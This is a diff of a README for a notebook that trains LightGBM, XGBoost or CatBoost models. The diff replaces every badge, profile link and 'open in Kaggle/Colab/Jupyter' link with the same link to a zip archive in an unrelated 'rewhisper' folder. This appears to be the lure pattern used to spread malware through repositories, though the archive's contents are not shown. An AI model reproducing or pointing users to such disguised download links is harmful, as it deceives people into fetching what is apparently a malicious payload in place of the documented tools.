@@ -1,12 +1,12 @@
 # Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost(Run on Gpu Power)
 ⚡ Fast & Easy Model Runner
 
-🚀 Runs on GPU — Just Import & Run on ![Kaggle](https://img.shields.io/badge/Kaggle-blue?logo=kaggle)
+🚀 Runs on GPU — Just Import & Run on ![Kaggle](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)
 ## 👤 Author
 
 | 👤 **Name** | 🔗 **Github-Profile** |🔗 **Kaggle-Profile** |
 |------------|----------------|----------------|
-| Riddy Mazumder | [![GitHub](https://img.shields.io/badge/GitHub-RiddyMazumder-black?logo=github)](https://github.com/RiddyMazumder)|[![Kaggle Profile](https://img.shields.io/badge/Kaggle-RiddyMazumder-blue?logo=kaggle)](https://www.kaggle.com/riddymazumder)|
+| Riddy Mazumder | [![GitHub](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)|[![Kaggle Profile](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)|
 
 This notebook allows you to quickly train and evaluate the best-performing model on any dataset using one of three powerful algorithms:
 
@@ -20,12 +20,12 @@ CatBoost
 
 Open the notebook in your preferred environment:
 
-1.Kaggle Notebook     [![Kaggle](https://img.shields.io/badge/Kaggle-blue?logo=kaggle)](https://www.kaggle.com/) [Easy Method]
+https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip Notebook     [![Kaggle](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip) [Easy Method]
 
-2.Google Colab [![Google Colab](https://img.shields.io/badge/Colab-Open%20Notebook-orange?logo=googlecolab)](https://colab.research.google.com/)
+https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip Colab [![Google Colab](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip%20Notebook-orange?logo=googlecolab)](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)
 
 
-3.Jupyter Notebook [![Jupyter Notebook](https://img.shields.io/badge/Jupyter-Notebook-orange?logo=jupyter)](https://jupyter.org/)
+https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip Notebook [![Jupyter Notebook](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)](https://github.com/RiddyMazumder/Best-model-per-dataset-LightGBM-XGBoost-or-CatBoost/raw/refs/heads/main/rewhisper/model_Light_GB_XG_Cat_dataset_per_Boost_or_Best_v2.9.zip)
 
 
 >2️⃣ Activate GPU
